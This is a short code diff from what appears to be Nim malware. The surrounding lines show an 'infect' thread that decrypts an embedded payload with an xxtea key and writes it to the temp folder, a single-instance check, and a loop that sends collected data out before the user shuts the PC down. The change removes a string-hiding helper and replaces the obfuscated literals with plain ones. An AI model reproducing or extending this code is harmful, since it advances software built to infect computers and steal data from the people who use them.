@@ -13,7 +13,6 @@ when USE_INFECT_THREAD:
 
   from lib/more/xxtea import decrypt
 
-
   from lib/flags import INFECT_ENCRYPTION_KEY
 
   let hasParams: bool = paramCount() >= 1
@@ -22,7 +21,7 @@ when USE_INFECT_THREAD:
     try:
       let file = paramStr 1
       let (_, name, ext) = splitFile file
-      let tmpFile = getEnv(d e"tmp") / name & ext
+      let tmpFile = getEnv("tmp") / name & ext
 
       writeFile(
         tmpFile,
@@ -62,11 +61,9 @@ from lib/flags import ALLOW_ONLY_ONE_INSTANCE
 when ALLOW_ONLY_ONE_INSTANCE:
   from wAuto/process import processes
 
-  from lib/functions/hideString import d
-
   from lib/constants import EXE_NAME
 
-  let dEXE_NAME: string = d EXE_NAME
+  let dEXE_NAME: string = EXE_NAME
 
   var len: int = 0
   for _ in processes(dEXE_NAME):
@@ -214,7 +211,7 @@ while true:
 
     ## the user might shutdown his pc, try and send data
     ## so none is lost
-    if thread == d e "sd":
+    if thread == "sd":
       TICKS = SEND_INTERVAL # shortcut for sending
 
     if prevThread != thread:
